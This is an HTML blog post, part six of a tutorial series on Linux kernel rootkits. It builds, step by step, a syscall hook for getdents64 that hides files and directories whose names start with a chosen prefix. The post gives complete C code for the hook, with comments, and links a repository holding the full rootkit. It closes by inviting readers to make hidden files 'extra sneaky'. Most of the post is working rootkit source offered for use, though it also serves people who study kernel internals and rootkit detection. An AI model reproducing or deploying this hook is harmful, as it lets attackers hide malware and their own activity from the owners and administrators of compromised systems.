<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Linux Rootkits Part 6: Hiding Directories :: TheXcellerator</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="At this point, we&amp;rsquo;ve used several different techniques to manipulate the kernel into doing interesting things. We&amp;rsquo;re going to combine a few of these techniques now in order to hide certain files and directories from userspace. This post is probably the most intricate yet due to the fact that we have to manipulate the structure returned by the kernel to userspace.
Roughly speaking, directory listing is handled by the syscall sys_getdents64 and its 32-bit counterpart sys_getdents (we&amp;rsquo;ll want to hook both, but they are identical except for a small addition in the 32-bit version)." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/linux_rootkits_06/" />




<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/blue.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="/img/favicon/blue.png">



<meta name="twitter:card" content="summary" />

<meta name="twitter:creator" content="TheXcellerator" />


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Linux Rootkits Part 6: Hiding Directories :: TheXcellerator">
<meta property="og:description" content="At this point, we&amp;rsquo;ve used several different techniques to manipulate the kernel into doing interesting things. We&amp;rsquo;re going to combine a few of these techniques now in order to hide certain files and directories from userspace. This post is probably the most intricate yet due to the fact that we have to manipulate the structure returned by the kernel to userspace.
Roughly speaking, directory listing is handled by the syscall sys_getdents64 and its 32-bit counterpart sys_getdents (we&amp;rsquo;ll want to hook both, but they are identical except for a small addition in the 32-bit version)." />
<meta property="og:url" content="/posts/linux_rootkits_06/" />
<meta property="og:site_name" content="Linux Rootkits Part 6: Hiding Directories" />

  
    <meta property="og:image" content="/img/favicon/blue.png">
  

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

  <meta property="article:section" content="linux" />


  <meta property="article:published_time" content="2020-09-19 19:00:00 &#43;0100 BST" />












</head>
<body class="">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    TheXcellerator
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/categories/cryptography/">Cryptography</a></li>
        
      
        
          <li><a href="/categories/linux/">Linux</a></li>
        
      
        
          <li><a href="/categories/other/">Other</a></li>
        
      
        
          <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/categories/cryptography/">Cryptography</a></li>
      
    
      
        <li><a href="/categories/linux/">Linux</a></li>
      
    
      
        <li><a href="/categories/other/">Other</a></li>
      
    
      
        <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/linux_rootkits_06/">Linux Rootkits Part 6: Hiding Directories</a></h1>
  <div class="post-meta">
      
    <span class="post-date">
      2020-09-19
    </span>
    
    
    <span class="post-author">::
      TheXcellerator
    </span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/linux/">linux</a>&nbsp;
    
    #<a href="/tags/rootkit/">rootkit</a>&nbsp;
    
    #<a href="/tags/stealth/">stealth</a>&nbsp;
    
    #<a href="/tags/directories/">directories</a>&nbsp;
    
  </span>
  

  

  <div class="post-content"><div>
        <p>At this point, we&rsquo;ve used several different techniques to manipulate the kernel into doing interesting things. We&rsquo;re going to combine a few of these techniques now in order to hide certain files and directories from userspace. This post is probably the most intricate yet due to the fact that we have to manipulate the structure returned by the kernel to userspace.</p>
<p>Roughly speaking, directory listing is handled by the syscall <code>sys_getdents64</code> and its 32-bit counterpart <code>sys_getdents</code> (we&rsquo;ll want to hook both, but they are identical except for a small addition in the 32-bit version). Our hooks will call the real syscalls as normal, and then we will repeat the technique from <a href="../linux_rootkits_05/">Part 5</a>, making use of <code>copy_from_user()</code> and <code>copy_to_user()</code> to alter the buffer that is returned to userspace. The big difference here is that we can&rsquo;t simply overwrite the entire buffer with <code>0x00</code>, but instead we have to look at this buffer as the struct it really is and loop through its members.</p>
<h1 id="directory-listings-in-linux">Directory Listings in Linux<a href="#directory-listings-in-linux" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>As usual, lets try to understand that underlying kernel functionality that we are hoping to <em>influence</em> before writing anything. We begin by checking the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a> for <code>sys_getdents</code>. This gives us two results, as mentioned earlier; one for 32-bit and another for 64-bit. We will focus on the 64-bit version, <code>sys_getdents64</code>, for now. The syscall reference directs us to <a href="https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs/readdir.c#L351"><code>fs/readdir.c</code></a>, where we find the definition for <code>sys_getdents64</code>.</p>
<p>Because we want to control what this syscall returns to the user, it is helpful to take look at what this syscall actually does. To start us off, the function declaration is:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">SYSCALL_DEFINE3(getdents64, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, fd, <span style="color:#66d9ef">struct</span> linux_dirent64 __user <span style="color:#f92672">*</span>, dirent, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, count)
</code></pre></div><p>This macro translates to the slightly more familar:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sys_getdents64</span>( <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">struct</span> linux_dirent <span style="color:#ae81ff">64</span> __user <span style="color:#f92672">*</span> dirent, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count);
</code></pre></div><p>That <code>linux_dirent64</code> struct is what contains the information about the directory listings (dirent is short for &ldquo;directory entry&rdquo;). We can find it&rsquo;s definition in <a href="https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/include/linux/dirent.h#L5"><code>include/linux/dirent.h</code></a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> linux_dirent64 {
    u64         d_ino;
    s64         d_off;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>      d_reclen;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>       d_type;
    <span style="color:#66d9ef">char</span>        d_name[];
};
</code></pre></div><p>In particular, we see that it&rsquo;s got two interesting fields; <code>d_reclen</code> and <code>d_name</code>. The first is the <em>record length</em> and is the total size of the struct in bytes. This is useful because it lets us easily jump through these structs in memory looking for what we want. In our case we will compare <code>d_name</code> to a predefined prefix string as way of deciding which entries to hide. Looking back at <a href="https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs/readdir.c#L373"><code>include/linux/readdir.c</code></a> we can see <code>d_reclen</code> used in precisely this way (albeit after being copied into another struct first).</p>
<p>All this is a bit much, so let&rsquo;s take a concrete look at what listing a directory actually looks like with <code>strace ls</code>. Below is the annotated (and trimmed) output that I got:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Call execve syscall to execute &#34;ls&#34; with no arguments (and 72 environment vars)</span>
execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/usr/bin/ls&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;ls&#34;</span><span style="color:#f92672">]</span>, 0x7fff4b08aba0 /* <span style="color:#ae81ff">72</span> vars */<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

<span style="color:#75715e"># Redacted: Loading various libraries like libc into memory</span>

<span style="color:#75715e"># Call openat syscall with directory &#34;.&#34; to get a file descriptor (3)</span>
openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;.&#34;</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
<span style="color:#75715e"># Check the directory pointed to by file descriptor 3 exists</span>
fstat<span style="color:#f92672">(</span>3, <span style="color:#f92672">{</span>st_mode<span style="color:#f92672">=</span>S_IFDIR|0755, st_size<span style="color:#f92672">=</span>4096, ...<span style="color:#f92672">})</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#75715e"># Call getdents64 syscall with the file descriptor and a pointer to userspace</span>
getdents64<span style="color:#f92672">(</span>3, 0x55d9b3dc1400 /* <span style="color:#ae81ff">19</span> entries */, 32768<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">600</span>
<span style="color:#75715e"># Close the file descriptor</span>
close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

<span style="color:#75715e"># Redacted: Write the results to stdout</span>

+++ exited with <span style="color:#ae81ff">0</span> +++
</code></pre></div><p>Okay, this is a bit clearer. We can see <code>sys_getdents64</code> being called with all it&rsquo;s arguments and that it&rsquo;s written 600 bytes into the buffer we provided. At this point, we realise that we&rsquo;ll have to allocate our own buffer into kernel space, modify it there and then copy it back (just like in <a href="../linux_rootkits_05/">Part 5</a>). The trick will be how we find any entries that start with our chosen prefix string, as well as how we trick the system into skipping these entries once we&rsquo;ve found them.</p>
<h1 id="putting-something-together">Putting something together<a href="#putting-something-together" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>As in previous parts, I&rsquo;m only going to go through the <code>pt_regs</code> version of the syscall hook, and in this case, I&rsquo;ll only go through hooking <code>sys_getdents64</code>. In the full rookit (on the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.4_hiding_directories">repo</a>), there are <em>four</em> hooks in total: one each for <code>sys_getdents</code> and <code>sys_getdents64</code> as well as another two for the <code>pt_regs</code> and old-fashioned calling convention for each of those.</p>
<p>The rough outline of our hook will look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/dirent.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define PREFIX &#34;boogaloo&#34;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_getdents64)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);

asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_getdents64</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
{
    <span style="color:#75715e">/* Pull the userspace dirent struct out of pt_regs */</span>
    <span style="color:#66d9ef">struct</span> linux_dirent64 __user <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;

    <span style="color:#75715e">/* Declare our kernel version of the buffer that we&#39;ll copy into */</span>
    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>dirent_ker <span style="color:#f92672">=</span> NULL;

    <span style="color:#75715e">/* Call the real getdents64, and allocate ourselves a kernel buffer */</span>
    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> orig_getdents64(regs);
    dirent_ker <span style="color:#f92672">=</span> kzalloc(ret, GFP_KERNEL);

    <span style="color:#75715e">/* Check that neither of the above failed */</span>
    <span style="color:#66d9ef">if</span> ( (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (dirent_ker <span style="color:#f92672">==</span> NULL) )
        <span style="color:#66d9ef">return</span> ret;

    <span style="color:#75715e">/* Copy from the userspace buffer dirent, to our kernel buffer dirent_ker */</span>
    <span style="color:#66d9ef">long</span> error;
    error <span style="color:#f92672">=</span> copy_from_user(dirent_ker, dirent, ret);
    <span style="color:#66d9ef">if</span>(error)
        <span style="color:#66d9ef">goto</span> done;

    <span style="color:#75715e">/* Fiddle with dirent_ker */</span>

    <span style="color:#75715e">/* Copy dirent_ker back to userspace dirent */</span>
    error <span style="color:#f92672">=</span> copy_to_user(dirent, dirent_ker, ret);
    <span style="color:#66d9ef">if</span>(error)
        <span style="color:#66d9ef">goto</span> done;

done:
    <span style="color:#75715e">/* Free our buffer and return */</span>
    kfree(dirent_ker);
    <span style="color:#66d9ef">return</span> ret;
}
</code></pre></div><p>Hopefully by this point, the above skeleton makes perfect sense. It&rsquo;s only slightly different from where we started in <a href="../linux_rootkits_05/">Part 5</a>, but in that case the only &ldquo;fiddling&rdquo; we did was overwrite the kernel buffer with <code>0x00</code> before copying it back to userspace. This time around we need be a little cleverer.</p>
<h1 id="looping-through-directory-entries">Looping through directory entries<a href="#looping-through-directory-entries" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>In order to loop through these structs, we will introduce an <code>offset</code> variable, initially set to <code>0</code>, and a <code>current_dir</code> variable defined as another <code>linux_dirent64</code> struct. Then we&rsquo;ll set <code>current_dir = dirent_ker + offset</code>. To begin with, <code>current_dir</code> will just be the first struct in memory, and we can <code>memcmp</code> <code>current_dir-&gt;d_name</code> with our prefix (defined above as &ldquo;boogaloo&rdquo;). As we loop through, we can just increment <code>offset</code> by <code>current_dir-&gt;d_reclen</code> so that when <code>current_dir</code> gets redefined at the start of the loop, we will skip over the first struct and move on to the second. And so on we go, until <code>offset</code> is equal to the <code>ret</code> - the value returned by <code>orig_getdents64</code>.</p>
<p>Let&rsquo;s try putting this loop together first, but just print the <code>d_name</code> of each entry to the kernel buffer - then we&rsquo;ll worry about how to stop certain directories from being presented to the user. In what follows, only the new parts are commented.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/dirent.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define PREFIX &#34;boogaloo&#34;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_getdents64)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);

asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_getdents64</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
{
    <span style="color:#66d9ef">struct</span> linux_dirent64 __user <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;

    <span style="color:#75715e">/* Declare current_dir pointer and the offset variable */</span>
    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>current_dir, <span style="color:#f92672">*</span>dirent_ker <span style="color:#f92672">=</span> NULL;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> orig_getdents64(regs);
    dirent_ker <span style="color:#f92672">=</span> kzalloc(ret, GFP_KERNEL);

    <span style="color:#66d9ef">if</span> ( (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (dirent_ker <span style="color:#f92672">==</span> NULL) )
        <span style="color:#66d9ef">return</span> ret;

    <span style="color:#66d9ef">long</span> error;
    error <span style="color:#f92672">=</span> copy_from_user(dirent_ker, dirent, ret);
    <span style="color:#66d9ef">if</span>(error)
        <span style="color:#66d9ef">goto</span> done;

    <span style="color:#75715e">/* Loop over offset */</span>
    <span style="color:#66d9ef">while</span> (offset <span style="color:#f92672">&lt;</span> ret)
    {
        <span style="color:#75715e">/* Set current_dir = dirent_ker + offset 
</span><span style="color:#75715e">         * Note that we have to cast dirent_ker to (void *) so that we can add
</span><span style="color:#75715e">         * offset to it
</span><span style="color:#75715e">         */</span>
        current_dir <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)dirent_ker <span style="color:#f92672">+</span> offset;

        <span style="color:#75715e">/* Compare the first bytes of current_dir-&gt;d_name to PREFIX */</span>
        <span style="color:#66d9ef">if</span> ( memcmp(PREFIX, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(PREFIX)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
        {
            <span style="color:#75715e">/* Print to the kernel buffer */</span>
            printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: Found %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, current_dir<span style="color:#f92672">-&gt;</span>d_name);
        }

        <span style="color:#75715e">/* Increment offset by current_dir-&gt;d_reclen so that we iterate over
</span><span style="color:#75715e">         * the other structs when we loop
</span><span style="color:#75715e">         */</span>
        offset <span style="color:#f92672">+=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
    }

    error <span style="color:#f92672">=</span> copy_to_user(dirent, dirent_ker, ret);
    <span style="color:#66d9ef">if</span>(error)
        <span style="color:#66d9ef">goto</span> done;

done:
    kfree(dirent_ker);
    <span style="color:#66d9ef">return</span> ret;
}
</code></pre></div><p>If you want, you can try compiling this and check that it works (you might want to wait until the end, because you&rsquo;ll have to copy it out four times!). It should be clear what the new parts are doing (look for the comments), but if not, try re-reading the paragraph above it.</p>
<h1 id="the-good-stuff-hiding-directory-entries">The Good Stuff: Hiding Directory Entries!<a href="#the-good-stuff-hiding-directory-entries" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>The last thing we need to figure out is how to get the system to skip over any entries we find that start with our prefix &ldquo;boogaloo&rdquo;. The trick that we are going to use is to increment the <code>d_reclen</code> field of the entry <em>before</em> the one we want to hide by the <code>d_reclen</code> value of the &ldquo;boogaloo&rdquo; entry. To do this, we need yet another <code>linux_dirent64</code> struct, which we&rsquo;ll call <code>previous_dir</code>, and update it as we loop through everything. This means that, once we&rsquo;ve returned the buffer to the user, and some userspace tool (like <code>ls</code>) is looping through the entries just like we have, they&rsquo;ll get to the entry before the one we want to hide, and when it increments its looping variable by <code>d_reclen</code>, <em>it will completely jump over our secret entry</em>.</p>
<p>The only <em>gotcha</em> is what to do when there is no previous entry, i.e. if the entry we want to hide comes first? In this case, we&rsquo;ll need to shift everything up in memory by the <code>d_reclen</code> value of the first entry. To do this, we&rsquo;ll use <code>memmove()</code>, but we also have to remember to decrease <code>ret</code> by <code>d_reclen</code> too so that we don&rsquo;t run over the end of the buffer as we loop through the rest.</p>
<p>Okay, enough talk! Let&rsquo;s finish off this syscall hook. Again, only the new parts are commented:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/dirent.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">#define PREFIX &#34;boogaloo&#34;
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_getdents64)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);

asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_getdents64</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
{
    <span style="color:#66d9ef">struct</span> linux_dirent64 __user <span style="color:#f92672">*</span>dirent <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>)regs<span style="color:#f92672">-&gt;</span>si;

    <span style="color:#75715e">/* Declare the previous_dir struct for book-keeping */</span>
    <span style="color:#66d9ef">struct</span> linux_dirent64 <span style="color:#f92672">*</span>previous_dir, <span style="color:#f92672">*</span>current_dir, <span style="color:#f92672">*</span>dirent_ker <span style="color:#f92672">=</span> NULL;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> orig_getdents64(regs);
    dirent_ker <span style="color:#f92672">=</span> kzalloc(ret, GFP_KERNEL);

    <span style="color:#66d9ef">if</span> ( (ret <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (dirent_ker <span style="color:#f92672">==</span> NULL) )
        <span style="color:#66d9ef">return</span> ret;

    <span style="color:#66d9ef">long</span> error;
    error <span style="color:#f92672">=</span> copy_from_user(dirent_ker, dirent, ret);
    <span style="color:#66d9ef">if</span>(error)
        <span style="color:#66d9ef">goto</span> done;

    <span style="color:#66d9ef">while</span> (offset <span style="color:#f92672">&lt;</span> ret)
    {
        current_dir <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)dirent_ker <span style="color:#f92672">+</span> offset;

        <span style="color:#66d9ef">if</span> ( memcmp(PREFIX, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(PREFIX)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
        {
            <span style="color:#75715e">/* Check for the special case when we need to hide the first entry */</span>
            <span style="color:#66d9ef">if</span>( current_dir <span style="color:#f92672">==</span> dirent_ker )
            {
                <span style="color:#75715e">/* Decrement ret and shift all the structs up in memory */</span>
                ret <span style="color:#f92672">-=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
                memmove(current_dir, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)current_dir <span style="color:#f92672">+</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen, ret);
                <span style="color:#66d9ef">continue</span>;
            }
            <span style="color:#75715e">/* Hide the secret entry by incrementing d_reclen of previous_dir by
</span><span style="color:#75715e">             * that of the entry we want to hide - effectively &#34;swallowing&#34; it
</span><span style="color:#75715e">             */</span>
            previous_dir<span style="color:#f92672">-&gt;</span>d_reclen <span style="color:#f92672">+=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
        }
        <span style="color:#66d9ef">else</span>
        {
            <span style="color:#75715e">/* Set previous_dir to current_dir before looping where current_dir
</span><span style="color:#75715e">             * gets incremented to the next entry
</span><span style="color:#75715e">             */</span>
            previous_dir <span style="color:#f92672">=</span> current_dir;
        }

        offset <span style="color:#f92672">+=</span> current_dir<span style="color:#f92672">-&gt;</span>d_reclen;
    }

    error <span style="color:#f92672">=</span> copy_to_user(dirent, dirent_ker, ret);
    <span style="color:#66d9ef">if</span>(error)
        <span style="color:#66d9ef">goto</span> done;

done:
    kfree(dirent_ker);
    <span style="color:#66d9ef">return</span> ret;
}
</code></pre></div><p>It&rsquo;s worth taking a bit to absorb what&rsquo;s going on here and it would be no bad thing to go back and re-read each of the three versions of the hook and their explanations - it certainly took me a long time to write them using several different sources!</p>
<h1 id="putting-it-all-together">Putting it all together<a href="#putting-it-all-together" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Now&rsquo;s the time to finish up your hooks with Ftrace, as well as the <code>sys_getdents</code> version for 32-bit systems <em>and</em> the alternative calling convention without <code>pt_regs</code>. In total, you&rsquo;ll have four copies of essentially the same hook. Note that there is a little trick with the <code>sys_getdents</code> hook though. In their hopes to move away from 32-bit systems, the kernel developers removed the definition of <code>linux_dirent</code> (note the absense of &ldquo;64&rdquo;) from the kernel headers. It&rsquo;s still in the kernel, but because it&rsquo;s not in the headers, your module will fail to build. The solution is to just define it yourself, as I did on line <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/10827fe28e795737be81cc057d67f4075c7bed7e/3_RootkitTechniques/3.4_hiding_directories/rootkit.c#L116">116</a> of <code>rootkit.c</code> in the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.4_hiding_directories">repo</a>. Here is the definition from <a href="https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs/readdir.c#L204"><code>fs/readdir.c</code></a> if you&rsquo;re trying to work it out yourself without peeking at my version:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> linux_dirent {
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> d_ino;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> d_off;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen;
    <span style="color:#66d9ef">char</span> d_name[];
};
</code></pre></div><p>Let&rsquo;s take a look at what happens when we go ahead and load this rootkit after creating a file that we&rsquo;d like to hide.</p>
<p><img src="/img/boogaloo.png" alt="Boogaloo"></p>
<p>Success! The secret &ldquo;boogaloo&rdquo; file gets hidden from the user! It&rsquo;s worth pointing out that the file <em>is still there</em> and you can go ahead and open it, delete it, etc without any trouble, but don&rsquo;t expect it to show up in <code>ls</code>! If you wanted to be extra sneaky, you might be able to find a way to prevent being able to read or write to a file, but still allow it to be executed? That&rsquo;s left as an exercise for you, dear reader!</p>
<p>Hope you enjoyed working through this one - Well Done for making to the end! This is definitely the trickiest technique to get your head around due to how many steps it involves.</p>
<p>Until next time&hellip;</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/posts/docker_escape/">
                <span class="button__icon">←</span>
                <span class="button__text">Privileged Container Escapes with Kernel Modules</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="/posts/linux_rootkits_05/">
                <span class="button__text">Linux Rootkits Part 5: Hiding Kernel Modules from Userspace</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Harvey Phillips 2020 - London, England</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>





  
</div>

</body>
</html>
